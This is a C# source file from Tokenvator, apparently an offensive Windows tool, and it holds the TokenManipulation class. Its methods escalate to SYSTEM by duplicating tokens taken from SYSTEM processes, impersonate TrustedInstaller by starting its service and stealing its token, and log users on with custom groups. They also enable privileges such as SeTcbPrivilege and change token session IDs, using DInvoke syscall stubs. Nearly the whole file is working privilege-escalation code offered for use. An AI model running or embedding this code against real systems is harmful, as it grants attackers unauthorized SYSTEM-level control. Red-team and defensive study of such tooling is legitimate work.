using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

using DInvoke.DynamicInvoke;

using Tokenvator.Resources;
using Tokenvator.Plugins.Enumeration;
using Tokenvator.Plugins.Execution;

using MonkeyWorks.Unmanaged.Headers;
using MonkeyWorks.Unmanaged.Libraries;


namespace Tokenvator.Plugins.AccessTokens
{
    using MonkeyWorks = MonkeyWorks.Unmanaged.Libraries.DInvoke;

    partial class TokenManipulation : AccessTokens
    {
        private Dictionary<uint, string> processes;

        public static List<string> validPrivileges = new List<string> { "SeAssignPrimaryTokenPrivilege",
            "SeAuditPrivilege", "SeBackupPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege",
            "SeCreatePagefilePrivilege", "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege",
            "SeCreateTokenPrivilege", "SeDebugPrivilege", "SeEnableDelegationPrivilege",
            "SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege", "SeIncreaseQuotaPrivilege",
            "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege", "SeLockMemoryPrivilege",
            "SeMachineAccountPrivilege", "SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege",
            "SeRelabelPrivilege", "SeRemoteShutdownPrivilege", "SeRestorePrivilege", "SeSecurityPrivilege",
            "SeShutdownPrivilege", "SeSyncAgentPrivilege", "SeSystemEnvironmentPrivilege",
            "SeSystemProfilePrivilege", "SeSystemtimePrivilege", "SeTakeOwnershipPrivilege",
            "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege",
            "SeUndockPrivilege", "SeUnsolicitedInputPrivilege" };

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Default Constructor
        /// </summary>
        /// <param name="currentProcessToken"></param>
        ////////////////////////////////////////////////////////////////////////////////
        internal TokenManipulation(IntPtr currentProcessToken) : base(currentProcessToken)
        {
            processes = new Dictionary<uint, string>();
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// IDisposable to free the allocated pointers
        /// </summary>
        ////////////////////////////////////////////////////////////////////////////////
        public override void Dispose()
        {
            base.Dispose();
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Default destructor
        /// </summary>
        ////////////////////////////////////////////////////////////////////////////////
        ~TokenManipulation()
        {
            Dispose();
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Should be able to replace with a single syscall
        /// </summary>
        ////////////////////////////////////////////////////////////////////////////////
        public void DisableAndRemoveAllTokenPrivileges()
        {
            IntPtr hNtAdjustPrivilegesToken = Generic.GetSyscallStub("NtAdjustPrivilegesToken");
            MonkeyWorks.ntdll.NtAdjustPrivilegesToken fSyscallNtAdjustPrivilegesToken = (MonkeyWorks.ntdll.NtAdjustPrivilegesToken)Marshal.GetDelegateForFunctionPointer(hNtAdjustPrivilegesToken, typeof(MonkeyWorks.ntdll.NtAdjustPrivilegesToken));

            Winnt._TOKEN_PRIVILEGES_ARRAY newTokenPrivileges = new Winnt._TOKEN_PRIVILEGES_ARRAY();
            Winnt._TOKEN_PRIVILEGES_ARRAY previousTokenPrivileges = new Winnt._TOKEN_PRIVILEGES_ARRAY();

            //fSyscallNtAdjustPrivilegesToken(hWorkingToken, true, );

            ////////////////////////////////////////////////////////////////////////////////
            Console.WriteLine("[*] Enumerating Token Privileges");
            uint TokenInfLength = 0;
            advapi32.GetTokenInformation(hExistingToken, Winnt._TOKEN_INFORMATION_CLASS.TokenPrivileges, IntPtr.Zero, 0, out TokenInfLength);

            if (TokenInfLength < 0 || TokenInfLength > int.MaxValue)
            {
                Misc.GetWin32Error("GetTokenInformation - 1 " + TokenInfLength);
                return;
            }
            Console.WriteLine("[*] GetTokenInformation - Pass 1");
            IntPtr lpTokenInformation = Marshal.AllocHGlobal((int)TokenInfLength);

            ////////////////////////////////////////////////////////////////////////////////
            if (!advapi32.GetTokenInformation(hExistingToken, Winnt._TOKEN_INFORMATION_CLASS.TokenPrivileges, lpTokenInformation, TokenInfLength, out TokenInfLength))
            {
                Misc.GetWin32Error("GetTokenInformation - 2 " + TokenInfLength);
                return;
            }
            Console.WriteLine("[*] GetTokenInformation - Pass 2");
            Winnt._TOKEN_PRIVILEGES_ARRAY tokenPrivileges = (Winnt._TOKEN_PRIVILEGES_ARRAY)Marshal.PtrToStructure(lpTokenInformation, typeof(Winnt._TOKEN_PRIVILEGES_ARRAY));
            Marshal.FreeHGlobal(lpTokenInformation);
            Console.WriteLine("[+] Enumerated {0} Privileges", tokenPrivileges.PrivilegeCount);
            Console.WriteLine();
            Console.WriteLine("{0,-45}{1,-30}", "Privilege Name", "Enabled");
            Console.WriteLine("{0,-45}{1,-30}", "--------------", "-------");
            ////////////////////////////////////////////////////////////////////////////////
            for (int i = 0; i < tokenPrivileges.PrivilegeCount; i++)
            {
                StringBuilder lpName = new StringBuilder();
                int cchName = 0;
                IntPtr lpLuid = Marshal.AllocHGlobal(Marshal.SizeOf(tokenPrivileges.Privileges[i]));
                Marshal.StructureToPtr(tokenPrivileges.Privileges[i].Luid, lpLuid, true);

                advapi32.LookupPrivilegeName(null, lpLuid, null, ref cchName);
                if (cchName <= 0 || cchName > int.MaxValue)
                {
                    Misc.GetWin32Error("LookupPrivilegeName Pass 1");
                    Marshal.FreeHGlobal(lpLuid);
                    continue;
                }

                lpName.EnsureCapacity(cchName + 1);
                if (!advapi32.LookupPrivilegeName(null, lpLuid, lpName, ref cchName))
                {
                    Misc.GetWin32Error("LookupPrivilegeName Pass 2");
                    Marshal.FreeHGlobal(lpLuid);
                    continue;
                }

                Winnt._PRIVILEGE_SET privilegeSet = new Winnt._PRIVILEGE_SET
                {
                    PrivilegeCount = 1,
                    Control = Winnt.PRIVILEGE_SET_ALL_NECESSARY,
                    Privilege = new Winnt._LUID_AND_ATTRIBUTES[] { tokenPrivileges.Privileges[i] }
                };

                int pfResult = 0;
                if (!advapi32.PrivilegeCheck(hExistingToken, ref privilegeSet, out pfResult))
                {
                    Misc.GetWin32Error("PrivilegeCheck");
                    Marshal.FreeHGlobal(lpLuid);
                    continue;
                }
                if (Convert.ToBoolean(pfResult))
                {
                    SetTokenPrivilege(lpName.ToString(), Winnt.TokenPrivileges.SE_PRIVILEGE_NONE);
                }
                SetTokenPrivilege(lpName.ToString(), Winnt.TokenPrivileges.SE_PRIVILEGE_REMOVED);
                Marshal.FreeHGlobal(lpLuid);
            }
            Console.WriteLine();
        }

        #region Privilege Escalations
        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Starts a process with a duplicated SYSTEM Token
        /// No conversions required
        /// </summary>
        /// <returns></returns>
        ////////////////////////////////////////////////////////////////////////////////
        public bool GetSystem(string newProcess)
        {
            SecurityIdentifier securityIdentifier = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null);
            NTAccount systemAccount = (NTAccount)securityIdentifier.Translate(typeof(NTAccount));

            Console.WriteLine("[*] Searching for {0}", systemAccount.ToString());
            processes = UserSessions.EnumerateUserProcesses(false, systemAccount.ToString());

            foreach (uint process in processes.Keys)
            {
                if (!OpenProcessToken((int)process))
                {
                    continue;
                }

                SetWorkingTokenToRemote();

                if (DuplicateToken(Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation))
                {
                    SetWorkingTokenToNewToken();
                    if (StartProcessAsUser(newProcess))
                    {
                        return true;
                    }
                }
            }

            Misc.GetWin32Error("GetSystem");
            return false;
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Impersonates a SYSTEM Token
        /// No conversions required
        /// </summary>
        /// <returns></returns>
        ////////////////////////////////////////////////////////////////////////////////
        public bool GetSystem()
        {
            SecurityIdentifier securityIdentifier = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null);
            NTAccount systemAccount = (NTAccount)securityIdentifier.Translate(typeof(NTAccount));

            Console.WriteLine("[*] Searching for {0}", systemAccount.ToString());
            processes = UserSessions.EnumerateUserProcesses(false, systemAccount.ToString());

            foreach (uint process in processes.Keys)
            {
                if (!OpenProcessToken((int)process))
                {
                     continue;
                }

                SetWorkingTokenToRemote();

                if (ImpersonateUser())
                {
                    return true;
                }
            }
            return false;
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Start a process as SYSTEM w/ Trusted Installer Group
        /// No conversions required
        /// </summary>
        /// <returns></returns>
        ////////////////////////////////////////////////////////////////////////////////
        public bool GetTrustedInstaller(string newProcess)
        {
            Console.WriteLine("[+] Getting NT AUTHORITY\\SYSTEM privileges");
            //This is required for duplicate token
            GetSystem();
            Console.WriteLine(" [*] Running as: {0}", WindowsIdentity.GetCurrent().Name);

            Services services = new Services("TrustedInstaller");
            if (!services.StartService())
            {
                Misc.GetWin32Error("StartService");
                return false;
            }

            if (!OpenProcessToken((int)services.GetServiceProcessId()))
            {
                Misc.GetWin32Error("OpenProcessToken");
                return false;
            }

            SetWorkingTokenToRemote();
            if (!DuplicateToken(Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation))
            {
                Misc.GetWin32Error("DuplicateToken");
                return false;
            }

            SetWorkingTokenToNewToken();
            if (!StartProcessAsUser(newProcess))
            {
                Misc.GetWin32Error("StartProcessAsUser");
                return false;
            }

            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Impersonates a SYSTEM token w/ Trusted Installer Group
        /// No conversions required
        /// </summary>
        /// <returns></returns>
        ////////////////////////////////////////////////////////////////////////////////
        public bool GetTrustedInstaller()
        {
            Console.WriteLine("[*] Getting NT AUTHORITY\\SYSTEM privileges");
            GetSystem();
            Console.WriteLine(" [+] Running as: {0}", WindowsIdentity.GetCurrent().Name);

            Services services = new Services("TrustedInstaller");
            if (!services.StartService())
            {
                Misc.GetWin32Error("StartService");
                return false;
            }

            if (!OpenProcessToken((int)services.GetServiceProcessId()))
            {
                return false;
            }

            SetWorkingTokenToRemote();
            if (!ImpersonateUser())
            {
                return false;
            }

            return true;
        }
        #endregion

        ////////////////////////////////////////////////////////////////////////////////
        // Should be a simple conversion
        // Combine with lower function
        ////////////////////////////////////////////////////////////////////////////////
        public void LogonUser(string domain, string username, string password, Winbase.LOGON_TYPE logonType, string command, string arguments)
        {
            if (!advapi32.LogonUser(username, domain, password, logonType, Winbase.LOGON_PROVIDER.LOGON32_PROVIDER_DEFAULT, out hExistingToken))
            {
                Misc.GetWin32Error("LogonUser");
                return;
            }
            Console.WriteLine("[+] Logged On {0}", username.TrimEnd());

            if (Winbase.LOGON_TYPE.LOGON32_LOGON_SERVICE == logonType)
            {
                if (!SetTokenSessionId(Process.GetCurrentProcess().SessionId))
                {
                    Console.WriteLine(" [-] Unable to Update Token Session ID, this is likely to cause problems with this token");
                }
            }

            if (string.IsNullOrEmpty(command))
            {
                SetWorkingTokenToRemote();
                ImpersonateUser();
            }
            else
            {
                Create createProcess;
                if (0 == Process.GetCurrentProcess().SessionId)
                    createProcess = CreateProcess.CreateProcessWithLogonW;
                else
                    createProcess = CreateProcess.CreateProcessWithTokenW;

                createProcess(hExistingToken, command, arguments);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Combine with above method
        ////////////////////////////////////////////////////////////////////////////////
        public void LogonUser(string domain, string username, string password, string groups, Winbase.LOGON_TYPE logonType, string command, string arguments)
        {
            SetWorkingTokenToSelf();

            Ntifs._TOKEN_GROUPS tokenGroups;
            Winnt._TOKEN_PRIMARY_GROUP tokenPrimaryGroup;
            using (CreateTokens ct = new CreateTokens(hWorkingToken))
            {
                ct.CreateTokenGroups(domain, username, out tokenGroups, out tokenPrimaryGroup, groups.Split(','));
            }

            if (!advapi32.LogonUserExExW(
                username, domain, password, 
                logonType, 
                Winbase.LOGON_PROVIDER.LOGON32_PROVIDER_DEFAULT, 
                ref tokenGroups, 
                out hExistingToken, 
                IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero))
            {
                Misc.GetWin32Error("LogonUserExExW");
                return;
            }
            Console.WriteLine("[+] Logged On {0}", username.TrimEnd());

            if (Winbase.LOGON_TYPE.LOGON32_LOGON_SERVICE == logonType)
            {
                SetWorkingTokenToRemote();
                if (!SetTokenSessionId(Process.GetCurrentProcess().SessionId))
                {
                    Console.WriteLine(" [-] Unable to Update Token Session ID, this is likely to cause problems with this token");
                }
            }

            using (DesktopACL da = new DesktopACL())
            {
                da.OpenWindow();
                da.OpenDesktop();
            }

            if (string.IsNullOrEmpty(command))
            {
                SetWorkingTokenToRemote();
                ImpersonateUser();
            }
            else
            {
                Create createProcess;
                if (0 == Process.GetCurrentProcess().SessionId)
                    createProcess = CreateProcess.CreateProcessWithLogonW;
                else
                    createProcess = CreateProcess.CreateProcessWithTokenW;

                createProcess(hExistingToken, command, arguments);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Can be use to remove groups, adding groups would require a new token 
        // Next Release 
        // Change Mainloop.Modules method name
        //https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokengroups
        ////////////////////////////////////////////////////////////////////////////////
        public void SetTokenGroup(string group, bool isSID)
        {
            var tokenGroups = new Ntifs._TOKEN_GROUPS();
            tokenGroups.Initialize();

            if (!DuplicateToken(Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation))
            {
                return;
            }
            SetWorkingTokenToNewToken();

            TokenInformation ti = new TokenInformation(hWorkingToken);
            ti.GetTokenGroups();
            for (int i = 0; i < ti.tokenGroups.GroupCount; i++)
            {
                tokenGroups.Groups[i].Sid = ti.tokenGroups.Groups[i].Sid;
                tokenGroups.Groups[i].Attributes = ti.tokenGroups.Groups[i].Attributes;
                Console.WriteLine(tokenGroups.Groups[i].Sid);
            }
            tokenGroups.GroupCount = ti.tokenGroups.GroupCount;

            if (!isSID)
            {
                Console.WriteLine("Group:     {0}", group);
                string domain = Environment.MachineName;
                if (group.Contains(@"\"))
                {
                    string[] split = group.Split('\\');
                    domain = split[0];
                    group = split[1];
                }
                group = new NTAccount(domain, group).Translate(typeof(SecurityIdentifier)).Value;
            }
            Console.WriteLine("Group SID: {0}", group);
            ++tokenGroups.GroupCount;

            if (!CreateTokens.InitializeSid("S-1-5-21-258464558-1780981397-2849438727-1010", ref tokenGroups.Groups[tokenGroups.GroupCount].Sid))
            {
                return;
            }
            tokenGroups.Groups[tokenGroups.GroupCount].Attributes = (uint)Winnt.SE_GROUP_ENABLED;
            CreateTokens ct = new CreateTokens(hWorkingToken);

            string userName = WindowsIdentity.GetCurrent().Name;
            userName = userName.Split('\\')[1];

            //ct.CreateTokenGroups(userName, out Ntifs._TOKEN_GROUPS tg, out Winnt._TOKEN_PRIMARY_GROUP tpg);

            tokenGroups = ti.tokenGroups;

            uint returnLength;
            if (!advapi32.AdjustTokenGroups(hWorkingToken, false, ref tokenGroups, (uint)Marshal.SizeOf(tokenGroups), ref ti.tokenGroups, out returnLength))
            {
                Misc.GetWin32Error("AdjustTokenGroups");
                return;
            }

            ti.GetTokenGroups();
            ti.Dispose();

            Console.WriteLine(returnLength);
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Updates a privilege on an impersonation / thread token
        /// No Conversions Required
        /// </summary>
        /// <param name="privilege"></param>
        /// <param name="attribute"></param>
        ////////////////////////////////////////////////////////////////////////////////
        public void SetThreadTokenPrivilege(string privilege, Winnt.TokenPrivileges attribute)
        {
            foreach (uint t in threads)
            {
                Console.WriteLine("[*] Thread ID: " + t);
                if (!OpenThreadToken(t, Winnt.TOKEN_ALL_ACCESS))
                {
                    continue;
                }

                SetWorkingTokenToThreadToken();
                SetTokenPrivilege(privilege, attribute);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Sets a Token to have a specified privilege
        // http://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/
        // https://support.microsoft.com/en-us/help/131065/how-to-obtain-a-handle-to-any-process-with-sedebugprivilege
        //
        // This will be a fun conversion
        ////////////////////////////////////////////////////////////////////////////////
        public bool SetTokenPrivilege(string privilege, Winnt.TokenPrivileges attribute)
        {
            Console.WriteLine("[*] Adjusting Token Privilege {0} => {1}", privilege, attribute);
            ////////////////////////////////////////////////////////////////////////////////
            Winnt._LUID luid = new Winnt._LUID();
            if (!advapi32.LookupPrivilegeValue(null, privilege, ref luid))
            {
                Misc.GetWin32Error("LookupPrivilegeValue");
                return false;
            }
            Console.WriteLine(" [+] Recieved luid");

            ////////////////////////////////////////////////////////////////////////////////
            Winnt._LUID_AND_ATTRIBUTES luidAndAttributes = new Winnt._LUID_AND_ATTRIBUTES
            {
                Luid = luid,
                Attributes = (uint)attribute
            };
            Winnt._TOKEN_PRIVILEGES newState = new Winnt._TOKEN_PRIVILEGES
            {
                PrivilegeCount = 1,
                Privileges = luidAndAttributes
            };
            Winnt._TOKEN_PRIVILEGES previousState = new Winnt._TOKEN_PRIVILEGES();
            Console.WriteLine(" [*] AdjustTokenPrivilege");
            uint returnLength;
            if (!advapi32.AdjustTokenPrivileges(hWorkingToken, false, ref newState, (uint)Marshal.SizeOf(newState), ref previousState, out returnLength))
            {
                Misc.GetWin32Error("AdjustTokenPrivileges");
                return false;
            }

            Console.WriteLine(" [+] Adjusted Privilege: {0}", privilege);
            Console.WriteLine(" [+] Privilege State: {0}", attribute);
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Updates the token session ID to the specified session
        // Does this even work?
        // Convert to syscalls
        ////////////////////////////////////////////////////////////////////////////////
        public bool SetTokenSessionId(int sessionId)
        {
            bool exists, enabled;
            SetWorkingTokenToSelf();

            using (TokenInformation ti = new TokenInformation(hWorkingToken))
            {
                ti.CheckTokenPrivilege(Winnt.SE_TCB_NAME, out exists, out enabled);
            }

            if (!exists)
            {
                Console.WriteLine("[-] SeTcbPrivilege Does Not Exist On Token");
                return false;
            }

            SetWorkingTokenToRemote();
            if (!enabled && !SetTokenPrivilege(Winnt.SE_TCB_NAME, Winnt.TokenPrivileges.SE_PRIVILEGE_ENABLED))
            {
                Console.WriteLine("[-] Enable SeTcbPrivilege Failed ");
                return false;
            }

            Console.WriteLine("[*] Updating Token Session ID to {0}", sessionId);

            GCHandle handle = new GCHandle();
            try
            {
                handle = GCHandle.Alloc(sessionId, GCHandleType.Pinned);
                if (!advapi32.SetTokenInformation(
                    hWorkingToken,
                    Winnt._TOKEN_INFORMATION_CLASS.TokenSessionId,
                    handle.AddrOfPinnedObject(),
                    sizeof(uint))
                )
                {
                    Misc.GetWin32Error("SetTokenInformation");
                    return false;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            finally
            {
                if (null != handle && handle.IsAllocated)
                    handle.Free();
            }
            return true;
        }
    }
}
